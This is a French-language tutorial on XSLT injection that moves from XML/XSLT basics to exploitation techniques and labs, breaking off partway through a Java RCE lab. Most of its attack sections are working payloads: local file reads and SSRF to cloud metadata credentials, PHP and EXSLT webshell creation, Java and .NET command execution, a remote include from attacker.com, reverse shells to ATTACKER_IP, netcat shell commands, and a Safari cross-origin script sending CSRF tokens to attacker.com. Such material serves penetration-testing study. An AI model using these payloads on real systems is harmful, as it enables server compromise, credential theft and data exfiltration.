# XSLT INJECTION

## <mark style="color:red;">XSLT INJECTION</mark>

### 📖 Table des matières

1. Introduction à XML et XSLT
2. Comprendre XSLT Injection
3. Reconnaissance et collecte d'informations
4. Techniques d'exploitation
5. Cas pratiques et labs
6. Contre-mesures et recommandations

***

### <mark style="color:blue;">1️⃣ INTRODUCTION À XML ET XSLT</mark>

#### 🔹 Qu'est-ce que XML ?

**XML (eXtensible Markup Language)** est un langage de balisage conçu pour structurer, stocker et transporter des données de manière lisible par l'homme et la machine.

**Exemple de document XML :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <book id="1">
    <title>Introduction à la sécurité</title>
    <author>John Doe</author>
    <price>29.99</price>
  </book>
  <book id="2">
    <title>Hacking éthique</title>
    <author>Jane Smith</author>
    <price>39.99</price>
  </book>
</catalog>
```

**Caractéristiques clés :**

* Format texte, extensible et auto-descriptif
* Structure hiérarchique avec balises ouvrantes/fermantes
* Sensible à la casse
* Doit être "well-formed" (bien formé)

***

#### <mark style="color:blue;">🔹 Qu'est-ce que XSLT ?</mark>

**XSLT (eXtensible Stylesheet Language Transformations)** est un langage créé pour **transformer des documents XML** en d'autres formats (HTML, texte, XML différent, PDF, etc.).

**Analogie simple :**

* XML = Les données brutes
* XSLT = Le programme qui transforme ces données
* Résultat = Document formaté (HTML, texte, etc.)

**Exemple de transformation XSLT :**

**Document XML (books.xml) :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="transform.xsl"?>
<catalog>
  <book>
    <title>Sécurité Web</title>
    <author>Alice</author>
  </book>
</catalog>
```

**Feuille de style XSLT (transform.xsl) :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <h1>Catalogue de livres</h1>
        <xsl:for-each select="catalog/book">
          <p>
            <b>Titre:</b> <xsl:value-of select="title"/><br/>
            <b>Auteur:</b> <xsl:value-of select="author"/>
          </p>
        </xsl:for-each>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**Résultat HTML :**

```html
<html>
  <body>
    <h1>Catalogue de livres</h1>
    <p>
      <b>Titre:</b> Sécurité Web<br/>
      <b>Auteur:</b> Alice
    </p>
  </body>
</html>
```

***

#### 🔹 Versions de XSLT

| Version      | Date | Caractéristiques                                 |
| ------------ | ---- | ------------------------------------------------ |
| **XSLT 1.0** | 1999 | Version la plus déployée, support limité         |
| **XSLT 2.0** | 2007 | Fonctionnalités avancées, types de données       |
| **XSLT 3.0** | 2017 | Streaming, packages, fonctions d'ordre supérieur |

**Ce cours se concentre sur XSLT 1.0** car c'est la version la plus utilisée et donc la plus exposée aux vulnérabilités.

***

#### 🔹 Processeurs XSLT

Les processeurs XSLT sont les moteurs qui exécutent les transformations :

**🖥️ Côté serveur :**

* **Libxslt** (Gnome) - Utilisé par xsltproc, PHP, Python, Ruby
* **Xalan** (Apache) - Versions C++ et Java
* **Saxon** (Saxonica) - Java, JavaScript, .NET

**🌐 Côté client (navigateurs) :**

* Chrome, Safari, Opera → Utilisent Libxslt
* Firefox → Utilise Transformiix
* Internet Explorer → Moteur Microsoft

***

#### 🔹 Fonctions XSLT importantes

| Fonction            | Description                 | Exemple                             |
| ------------------- | --------------------------- | ----------------------------------- |
| `<xsl:value-of>`    | Extrait la valeur d'un nœud | `<xsl:value-of select="title"/>`    |
| `<xsl:for-each>`    | Boucle sur les éléments     | `<xsl:for-each select="book">`      |
| `<xsl:if>`          | Condition simple            | `<xsl:if test="price > 30">`        |
| `document()`        | Charge un document externe  | `document('/etc/passwd')`           |
| `system-property()` | Info sur le processeur      | `system-property('xsl:vendor')`     |
| `format-number()`   | Formate un nombre           | `format-number(1234.5, '#,###.00')` |

***

### <mark style="color:blue;">2️⃣ COMPRENDRE XSLT INJECTION</mark>

#### 🎯 Qu'est-ce que XSLT Injection ?

**Définition :** Une vulnérabilité qui permet à un attaquant d'injecter du code XSLT malveillant dans une feuille de style XSLT non validée, conduisant à :

* ✅ Lecture de fichiers arbitraires (LFI - Local File Inclusion)
* ✅ Exécution de code à distance (RCE - Remote Code Execution)
* ✅ Server-Side Request Forgery (SSRF)
* ✅ Divulgation d'informations sensibles
* ✅ Déni de service (DoS)
* ✅ Contournement de Same-Origin Policy (navigateurs)

***

#### 🔍 Pourquoi XSLT est dangereux ?

**1. Fonctions puissantes intégrées**

```xml
<!-- Lire des fichiers -->
<xsl:copy-of select="document('/etc/passwd')"/>

<!-- Exécuter du PHP -->
<xsl:value-of select="php:function('system','whoami')"/>

<!-- Exécuter du Java -->
<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'calc.exe')"/>
```

**2. Extensions dangereuses (EXSLT)**

```xml
<!-- Écrire des fichiers -->
<exploit:document href="shell.php" method="text">
  <?php system($_GET['cmd']); ?>
</exploit:document>
```

**3. Traitement non validé**

* Si l'application accepte des fichiers XSLT de l'utilisateur
* Si l'application construit dynamiquement des XSLT avec des données non filtrées

***

#### 📊 Scénarios d'attaque

```
┌─────────────────────────────────────────────────────────┐
│                    SCÉNARIO 1                           │
│         Application de génération de rapports           │
├─────────────────────────────────────────────────────────┤
│ 1. Utilisateur upload un fichier XML                   │
│ 2. Application applique une transformation XSLT        │
│ 3. Attaquant injecte du XSLT malveillant               │
│ 4. → Lecture de /etc/passwd                            │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│                    SCÉNARIO 2                           │
│            API REST avec transformation XML             │
├─────────────────────────────────────────────────────────┤
│ 1. API accepte XML + référence à XSLT                  │
│ 2. Serveur charge et applique le XSLT                  │
│ 3. Attaquant fournit XSLT malveillant                  │
│ 4. → Exécution de code sur le serveur                  │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│                    SCÉNARIO 3                           │
│         Application web avec XSLT côté client           │
├─────────────────────────────────────────────────────────┤
│ 1. Page web charge XML + XSLT                          │
│ 2. Navigateur applique la transformation               │
│ 3. XSLT malveillant contourne Same-Origin Policy       │
│ 4. → Vol de données cross-origin                       │
└─────────────────────────────────────────────────────────┘
```

***

### 3️⃣ RECONNAISSANCE ET COLLECTE D'INFORMATIONS

#### 🔎 Étape 1 : Identifier le processeur XSLT

**Pourquoi ?** Chaque processeur a ses propres vulnérabilités et fonctionnalités.

**Payload de reconnaissance :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <h2>Informations du processeur XSLT</h2>
        <p><b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/></p>
        <p><b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')"/></p>
        <p><b>Vendor URL:</b> <xsl:value-of select="system-property('xsl:vendor-url')"/></p>
        
        <!-- Propriétés Saxon spécifiques -->
        <xsl:if test="system-property('xsl:product-name')">
          <p><b>Product:</b> <xsl:value-of select="system-property('xsl:product-name')"/></p>
          <p><b>Version:</b> <xsl:value-of select="system-property('xsl:product-version')"/></p>
        </xsl:if>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**Résultats typiques :**

| Processeur | xsl:vendor                   | Support JavaScript     |
| ---------- | ---------------------------- | ---------------------- |
| Libxslt    | `libxslt`                    | Non (sauf navigateurs) |
| Xalan-C    | `Apache Software Foundation` | Non                    |
| Xalan-J    | `Apache Software Foundation` | Non                    |
| Saxon      | `Saxonica`                   | Non                    |
| Firefox    | `Transformiix`               | Oui                    |
| IE         | `Microsoft`                  | Oui                    |

***

#### 🔎 Étape 2 : Obtenir le chemin actuel

**Technique : Utiliser `unparsed-entity-uri()`**

**XML avec DTD :**

```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="path-disclosure.xsl"?>
<!DOCTYPE catalog [
  <!ELEMENT catalog ANY>
  <!NOTATION JPEG SYSTEM "urn:myNamespace">
  <!ENTITY currentpath SYSTEM "path-disclosure.xsl" NDATA JPEG>
]>
<catalog></catalog>
```

**XSLT :**

```xml
<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <h3>Chemin du fichier XSLT</h3>
        <p><xsl:value-of select="unparsed-entity-uri('currentpath')"/></p>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**Processeurs vulnérables :**

* ✅ Xalan-J, Saxon, PHP
* ✅ Safari, Opera, Chrome, Internet Explorer
* ❌ Xalan-C, xsltproc, Python, Perl, Ruby, Firefox

***

### 4️⃣ TECHNIQUES D'EXPLOITATION

#### 🎯 Technique 1 : External Entity (XXE via XSLT)

**Description :** Utiliser des entités externes pour lire des fichiers locaux.

**Payload :**

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample [
  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <h2>Contenu de /etc/passwd</h2>
        <pre>&ext_file;</pre>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**Fichiers intéressants à cibler :**

* `/etc/passwd` - Utilisateurs Linux
* `/etc/shadow` - Mots de passe hashés Linux
* `C:\Windows\win.ini` - Configuration Windows
* `.htpasswd` - Mots de passe Apache
* `.pgpass` - Credentials PostgreSQL

***

#### 🎯 Technique 2 : Lecture de fichiers avec `document()`

**Description :** La fonction `document()` peut charger des fichiers externes ou faire des requêtes SSRF.

**Payload - Lecture de fichier :**

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <!-- Lecture de fichier local -->
        <h3>Lecture de /etc/passwd</h3>
        <xsl:copy-of select="document('/etc/passwd')"/>
        
        <!-- Lecture Windows -->
        <h3>Lecture de win.ini</h3>
        <xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**Payload - SSRF (Server-Side Request Forgery) :**

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <!-- Requête vers un serveur interne -->
        <h3>SSRF vers port interne</h3>
        <xsl:copy-of select="document('http://192.168.1.1:8080/admin')"/>
        
        <!-- Scan de port -->
        <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**Processeurs vulnérables :**

* ✅ xsltproc, PHP, Perl
* ❌ Xalan-C, Xalan-J, Saxon, Python, Ruby
* ❌ Tous les navigateurs modernes (restrictions de sécurité)

***

#### 🎯 Technique 3 : Écriture de fichiers (EXSLT Extension)

**Description :** EXSLT permet d'écrire des fichiers sur le système.

**Payload - Créer un webshell PHP :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl">
  
  <xsl:template match="/">
    <exsl:document href="/var/www/html/shell.php" method="text">
      &lt;?php system($_GET['cmd']); ?&gt;
    </exsl:document>
    <result>Webshell créé avec succès !</result>
  </xsl:template>
</xsl:stylesheet>
```

**Payload - Créer un fichier malveillant :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit">
  
  <xsl:template match="/">
    <exploit:document href="backdoor.txt" method="text">
      Contenu malveillant ici
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

**Note :** Cette technique nécessite que :

* Le processeur supporte EXSLT
* L'application ait les permissions d'écriture
* Le chemin de destination soit accessible

***

#### 🎯 Technique 4 : RCE avec PHP Wrapper

**Description :** Exécuter des fonctions PHP directement via XSLT.

**4.1 - Exécuter `readfile()` :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" 
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
      xmlns:php="http://php.net/xsl">
  <body>
    <h2>Lecture de fichier avec PHP</h2>
    <pre>
      <xsl:value-of select="php:function('readfile','/etc/passwd')"/>
    </pre>
  </body>
</html>
```

**4.2 - Exécuter `scandir()` :**

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  
  <xsl:template match="/">
    <html>
      <body>
        <h2>Liste des fichiers dans /var/www</h2>
        <xsl:value-of select="php:function('scandir', '/var/www')"/>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**4.3 - Exécuter `system()` via `assert()` :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" 
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
      xmlns:php="http://php.net/xsl">
  <body>
    <xsl:variable name="payload">
      system('whoami')
    </xsl:variable>
    <xsl:variable name="exec" select="php:function('assert',$payload)"/>
    <result><xsl:value-of select="$exec"/></result>
  </body>
</html>
```

**4.4 - Charger un script PHP distant :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:php="http://php.net/xsl">
  <body>
    <xsl:variable name="payload">
      include("http://attacker.com/evil.php")
    </xsl:variable>
    <xsl:variable name="include" select="php:function('assert',$payload)"/>
  </body>
</html>
```

**4.5 - Créer un webshell avec `file_put_contents()` :**

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  
  <xsl:template match="/">
    <xsl:value-of select="php:function('file_put_contents',
                                       '/var/www/html/cmd.php',
                                       '&lt;?php echo system($_GET[&quot;c&quot;]); ?&gt;')"/>
    <result>Webshell créé à /var/www/html/cmd.php</result>
  </xsl:template>
</xsl:stylesheet>
```

**4.6 - Meterpreter via base64 :**

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  
  <xsl:template match="/">
    <xsl:variable name="eval">
      eval(base64_decode('BASE64_ENCODED_METERPRETER_PAYLOAD'))
    </xsl:variable>
    <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
  </xsl:template>
</xsl:stylesheet>
```

***

#### 🎯 Technique 5 : RCE avec Java

**Description :** Exécuter des commandes système via la classe `Runtime` de Java.

**5.1 - Exécution simple (Xalan-J) :**

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtobject,'whoami')"/>
    <xsl:variable name="processString" select="ob:toString($process)"/>
    <result><xsl:value-of select="$processString"/></result>
  </xsl:template>
</xsl:stylesheet>
```

**5.2 - Reverse shell :**

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtobject,
      'bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|{bash,-i}')"/>
  </xsl:template>
</xsl:stylesheet>
```

**5.3 - Saxon processor :**

```xml
<xsl:stylesheet version="2.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:java="http://saxon.sf.net/java-type">
  
  <xsl:template match="/">
    <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'calc.exe')"
                  xmlns:Runtime="java:java.lang.Runtime"/>
  </xsl:template>
</xsl:stylesheet>
```

***

#### 🎯 Technique 6 : RCE avec .NET (Windows)

**Description :** Exécuter du code C# directement dans XSLT pour les processeurs Microsoft.

**6.1 - Exécution CMD.exe :**

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:App="http://www.tempuri.org/App">
  
  <msxsl:script implements-prefix="App" language="C#">
    <![CDATA[
      public string Execute()
      {
        System.Diagnostics.Process.Start("cmd.exe", "/c calc.exe");
        return "Executed!";
      }
    ]]>
  </msxsl:script>
  
  <xsl:template match="/">
    <result><xsl:value-of select="App:Execute()"/></result>
  </xsl:template>
</xsl:stylesheet>
```

**6.2 - Exécution avec sortie :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="urn:my-scripts">
  
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
      public string execute()
      {
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "C:\\windows\\system32\\cmd.exe";
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.Arguments = "/c dir C:\\";
        proc.Start();
        proc.WaitForExit();
        return proc.StandardOutput.ReadToEnd();
      }
    ]]>
  </msxsl:script>
  
  <xsl:template match="/">
    <output>
      <pre><xsl:value-of select="user:execute()"/></pre>
    </output>
  </xsl:template>
</xsl:stylesheet>
```

**6.3 - Reverse shell .NET :**

```xml
<msxsl:script language="C#" implements-prefix="user">
  <![CDATA[
    public string ReverseShell()
    {
      System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("ATTACKER_IP", 4444);
      System.IO.StreamWriter stream = new System.IO.StreamWriter(client.GetStream());
      System.Diagnostics.Process proc = new System.Diagnostics.Process();
      proc.StartInfo.FileName = "cmd.exe";
      proc.StartInfo.RedirectStandardInput = true;
      proc.StartInfo.RedirectStandardOutput = true;
      proc.StartInfo.UseShellExecute = false;
      proc.Start();
      // Redirection I/O
      return "Connected";
    }
  ]]>
</msxsl:script>
```

***

#### 🎯 Technique 7 : Divulgation d'informations via erreurs

**Description :** Forcer des erreurs pour lire les premières lignes de fichiers non-XML.

**Principe :**

1. Charger un fichier non-XML avec `document()`
2. Le parseur échoue car ce n'est pas du XML valide
3. L'erreur affiche les premières lignes du fichier

**Payload :**

**XML :**

```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="error-disclosure.xsl"?>
<file>/etc/passwd</file>
```

**XSLT :**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document(file)"/>
  </xsl:template>
</xsl:stylesheet>
```

**Erreur typique (xsltproc) :**

```
parser error : Start tag expected, '<' not found
root:x:0:0:root:/root:/bin/bash
                                 ^
```

✅ **La première ligne de `/etc/passwd` est divulguée !**

**Fichiers intéressants à cibler :**

| Fichier       | Contenu                                   |
| ------------- | ----------------------------------------- |
| `/etc/passwd` | Utilisateurs et UID                       |
| `/etc/shadow` | Hashes de mots de passe (si accessible)   |
| `.htpasswd`   | Credentials Apache (`user:password_hash`) |
| `.pgpass`     | PostgreSQL (`host:port:db:user:pass`)     |
| `web.config`  | Configuration IIS avec credentials        |
| `config.php`  | Credentials de base de données            |

**Processeurs vulnérables :**

* ✅ xsltproc, PHP, Perl, Ruby (avec `import()` ou `include()`)
* ✅ Firefox (seulement dans le même répertoire)
* ❌ Xalan-C, Xalan-J, Saxon, Python
* ❌ Safari, Opera, Chrome, IE

***

#### 🎯 Technique 8 : Same-Origin Policy Bypass (Safari)

**Description :** Safari permet de contourner la Same-Origin Policy via XSLT pour voler des données cross-origin.

**Principe :**

1. Créer un fichier XHTML avec XSLT inline
2. Utiliser `document()` pour charger une URL cross-origin
3. Extraire les données avec `value-of()` ou `copy-of()`
4. Manipuler avec JavaScript et exfiltrer

**Payload complet :**

```xml
<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="xoss.xhtml"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns="http://www.w3.org/1999/xhtml">

  <xsl:template match="xsl:stylesheet">
    <xsl:apply-templates/>
  </xsl:template>

  <xsl:template match="/">
    <html>
      <head>
        <title>XOSS - Cross Origin Site Scripting</title>
      </head>
      <body>
        <h1>Cross-Origin Data Theft</h1>
        <table>
          <xsl:apply-templates />
        </table>
      </body>
    </html>
  </xsl:template>

  <xsl:template match="text()"/>

  <xsl:template match="//node()[local-name() = name()]">
    <xsl:if test="local-name() = 'url'">
      <xsl:variable name="url" select="document(.)"/>
```

```xml
      <tr>
        <td><b>URL:</b></td>
        <td><xsl:value-of select="."/></td>
      </tr>
      
      <tr>
        <td><b>value-of:</b></td>
        <td>
          <textarea id="valueOf" rows="10" cols="100">
            <xsl:value-of select="$url"/>
          </textarea>
        </td>
      </tr>
      
      <tr>
        <td><b>copy-of:</b></td>
        <td>
          <textarea id="copyOf" rows="10" cols="100">
            <xsl:copy-of select="$url"/>
          </textarea>
        </td>
      </tr>
      
      <tr>
        <td><b>Données volées:</b></td>
        <td>
          <input type="text" id="stolen"/>
          <script type="text/javascript">
            // Extraire les données sensibles
            var copyOf = document.getElementById("copyOf").value;
            var token = copyOf.match(/csrf_token":\s*"([^"]+)"/);
            if(token) {
              document.getElementById("stolen").value = token[1];
              // Exfiltrer vers serveur attaquant
              fetch('https://attacker.com/steal?data=' + token[1]);
            }
          </script>
        </td>
      </tr>
    </xsl:if>
    <xsl:apply-templates/>
  </xsl:template>

  <!-- URL cible à voler -->
  <read>
    <url>https://victim.com/api/user/profile</url>
  </read>

</xsl:stylesheet>
```

**Scénario d'attaque :**

1. Victime connectée à `victim.com`
2. Ouvre `xoss.xhtml` dans Safari
3. XSLT charge `https://victim.com/api/user/profile` avec les cookies de la victime
4. JavaScript extrait les données sensibles
5. Données exfiltrées vers `attacker.com`

**⚠️ Uniquement Safari est vulnérable à cette attaque !**

***

#### 🎯 Technique 9 : Perte de précision (Exploitation de logique)

**Description :** Exploiter les erreurs de calcul avec de grands nombres ou des décimales pour contourner la logique métier.

**9.1 - Perte de précision avec grands entiers :**

**XML :**

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<?xml-stylesheet type="text/xsl" href="bigint.xsl"?>
<root>
  <price>10000000000000000000000</price>
  <discount>9999999999999999999999</discount>
</root>
```

**XSLT :**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <result>
      Prix original: <xsl:value-of select="format-number(root/price, '#,###')"/>
      Réduction: <xsl:value-of select="format-number(root/discount, '#,###')"/>
      Prix final: <xsl:value-of select="format-number(root/price - root/discount, '#,###')"/>
    </result>
  </xsl:template>
</xsl:stylesheet>
```

**Impact :** Libxslt calcule incorrectement → Prix final = 0 ou négatif → Achat gratuit !

**9.2 - Perte de précision avec nombres réels :**

**XML :**

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<?xml-stylesheet type="text/xsl" href="precision.xsl"?>
<transaction>
  <amount1>1000.41</amount1>
  <amount2>1000</amount2>
</transaction>
```

**XSLT :**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <total>
      <xsl:value-of select="transaction/amount1 + transaction/amount2"/>
    </total>
  </xsl:template>
</xsl:stylesheet>
```

**Résultat attendu :** 2000.41\
**Résultat avec Xalan/Saxon :** 2000.4099999999999 ou 2000.40

**Impact :** Dans des systèmes financiers, erreurs d'arrondissement → Fraude possible

**Processeurs affectés :**

| Type      | Grands entiers | Nombres réels |
| --------- | -------------- | ------------- |
| Libxslt   | ❌ Erreurs      | ✅ OK          |
| Xalan-C/J | ❌ Erreurs      | ❌ Erreurs     |
| Saxon     | ✅ OK           | ❌ Erreurs     |
| Firefox   | ✅ OK           | ❌ Erreurs     |
| IE        | ✅ OK           | ❌ Erreurs     |

***

#### 🎯 Technique 10 : Nombres aléatoires non sécurisés

**Description :** Exploiter des générateurs de nombres aléatoires faibles pour prédire les valeurs.

**10.1 - Seed identique (Libxslt) :**

**XSLT :**

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:math="http://exslt.org/math"
  extension-element-prefixes="math">
  
  <xsl:template match="/">
    <random><xsl:value-of select="math:random()"/></random>
  </xsl:template>
</xsl:stylesheet>
```

**Exécution multiple (xsltproc) :**

```bash
$ xsltproc random.xsl input.xml
0.123456789

$ xsltproc random.xsl input.xml
0.123456789  # ← MÊME VALEUR !

$ xsltproc random.xsl input.xml
0.123456789  # ← TOUJOURS LA MÊME !
```

**Impact :**

* Token CSRF prévisible
* IV de chiffrement identique → Attaque par dictionnaire
* Session ID prévisible → Session hijacking

**10.2 - PRNG non cryptographique (Xalan, Saxon) :**

Ces processeurs utilisent :

* **Xalan-C :** `srand()` de C++ (documenté comme "bad random")
* **Xalan-J/Saxon :** `java.lang.Math.random()` (non sécurisé)

**⚠️ Ne JAMAIS utiliser XSLT pour générer :**

* Tokens de sécurité
* Clés cryptographiques
* IV pour CBC mode
* Nonces
* Session IDs

***

### 5️⃣ CAS PRATIQUES ET LABS

#### 🧪 Lab 1 : Lecture de fichiers locaux

**Objectif :** Lire `/etc/passwd` sur un serveur Linux

**Étape 1 : Créer le XML**

```xml
<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="exploit.xsl"?>
<data>test</data>
```

**Étape 2 : Créer le XSLT malveillant**

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
  <!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <h2>Contenu de /etc/passwd</h2>
        <pre>&passwd;</pre>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**Étape 3 : Tester**

```bash
xsltproc exploit.xsl data.xml
```

**Résultat attendu :**

```
<html>
  <body>
    <h2>Contenu de /etc/passwd</h2>
    <pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...</pre>
  </body>
</html>
```

***

#### 🧪 Lab 2 : SSRF pour scan de ports internes

**Objectif :** Scanner les ports internes d'un réseau privé

**XSLT :**

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <h2>Scan de ports internes</h2>
        
        <!-- Test port 22 (SSH) -->
        <h3>192.168.1.10:22</h3>
        <xsl:copy-of select="document('http://192.168.1.10:22')"/>
        
        <!-- Test port 80 (HTTP) -->
        <h3>192.168.1.10:80</h3>
        <xsl:copy-of select="document('http://192.168.1.10:80/admin')"/>
        
        <!-- Test port 3306 (MySQL) -->
        <h3>192.168.1.10:3306</h3>
        <xsl:copy-of select="document('http://192.168.1.10:3306')"/>
        
        <!-- Metadata AWS -->
        <h3>AWS Metadata</h3>
        <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**Analyse des résultats :**

* Timeout = Port fermé ou filtré
* Erreur de parsing = Port ouvert (service répond)
* Contenu affiché = Service HTTP accessible

***

#### 🧪 Lab 3 : RCE via PHP

**Objectif :** Obtenir un webshell sur un serveur PHP

**Étape 1 : Vérifier si PHP wrapper est disponible**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" 
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
      xmlns:php="http://php.net/xsl">
  <body>
    <xsl:value-of select="php:function('phpversion')"/>
  </body>
</html>
```

**Étape 2 : Créer le webshell**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  
  <xsl:template match="/">
    <xsl:value-of select="php:function('file_put_contents',
                                       '/var/www/html/shell.php',
                                       '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;')"/>
    <result>Webshell créé !</result>
  </xsl:template>
</xsl:stylesheet>
```

**Étape 3 : Accéder au webshell**

```
http://target.com/shell.php?cmd=id
http://target.com/shell.php?cmd=cat /etc/passwd
http://target.com/shell.php?cmd=nc -e /bin/bash ATTACKER_IP 4444
```

***

#### 🧪 Lab 4 : RCE via Java (Xalan)

**Objectif :** Exécuter des commandes sur serveur Java

**XSLT :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  
  <xsl:template match="/">
    <html>
      <body>
        <h2>Exécution de commandes</h2>
        
        <!-- Whoami -->
        <xsl:variable name="rtObj" select="rt:getRuntime()"/>
        <xsl:variable name="process" select="rt:exec($rtObj, 'whoami')"/>
